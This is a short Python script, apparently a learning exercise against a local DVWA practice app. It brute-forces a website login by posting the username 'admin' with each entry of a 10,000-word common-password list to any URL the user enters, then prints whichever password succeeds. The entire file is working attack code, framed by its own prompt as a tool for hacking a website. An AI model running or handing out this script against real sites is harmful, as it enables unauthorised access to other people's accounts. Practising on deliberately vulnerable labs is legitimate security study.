import requests

# url = "http://127.0.0.1/DVWA/login.php"
target_url = str(input("Please enter the url of the website you want to hack: "))
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("/root/PycharmProjects/Login_Info_Guesser/10k-most-common.txt", "r") as most_commom_passwords:
    for line in most_commom_passwords:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("The program found the password. The password is: " + word)
            print(response.content)
            exit()
print("The program could not find the password.")
print(response.content)


